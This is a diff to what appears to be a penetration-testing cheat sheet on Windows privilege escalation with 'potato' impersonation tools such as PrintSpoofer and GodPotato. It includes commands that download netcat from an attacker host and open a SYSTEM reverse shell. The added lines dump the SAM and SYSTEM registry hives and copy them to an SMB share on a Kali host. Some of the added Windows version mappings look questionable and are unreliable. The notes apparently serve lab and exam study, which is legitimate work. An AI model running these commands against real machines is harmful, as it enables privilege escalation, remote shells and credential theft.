@@ -46,15 +46,14 @@ whoami /priv
 
 Goal: coerce `NT AUTHORITY\SYSTEM` -> authenticate/connect -> impersonate -> `SYSTEM` shell
 
-|Tool|Notes|
-|---|---|
-|PrintSpoofer|common older OSCP/lab path|
-|RoguePotato|potato variant with network relay/coercion logic|
-|JuicyPotato|older Windows versions|
-|GodPotato|useful on newer Windows versions|
-|SigmaPotato|modern potato-style implementation|
-|SweetPotato|collection of potato-style methods|
-
+| Tool         | Notes                                            | Version                 |
+| ------------ | ------------------------------------------------ | ----------------------- |
+| PrintSpoofer | common older OSCP/lab path                       | Windows 10 (≥ 1809)     |
+| RoguePotato  | potato variant with network relay/coercion logic | Server 2019             |
+| JuicyPotato  | older Windows versions                           | Windows 7 / Server 2008 |
+| GodPotato    | useful on newer Windows versions                 | Windows 10 (≥ 1809)     |
+| SigmaPotato  | modern potato-style implementation               | Windows 11              |
+| SweetPotato  | collection of potato-style methods               | Windows 10 (≥ 1809)     |
 
 ### PrintSpoofer 
 
@@ -115,9 +114,14 @@ nt authority\system
 iwr -uri http://attacker_ip/nc64.exe -outfile nc.exe
 
 .\gp.exe -cmd "C:\Users\public\nc.exe attacker_ip 443 -e cmd"
+
+# if reverse shell does not work:
+.\gp -cmd "cmd /c reg.exe save HKLM\SAM C:\Windows\Temp\sam.bak"
+.\gp -cmd "cmd /c reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.bak"
+.\gp -cmd "cmd /c net use m: \\KALI_IP\share /user:kira kira"
+.\gp -cmd "cmd /c copy C:\Windows\Temp\system.bak m:\"
+.\gp -cmd "cmd /c copy C:\Windows\Temp\sam.bak m:\"
 ```
-
-
 
 ### SigmaPotato  
 
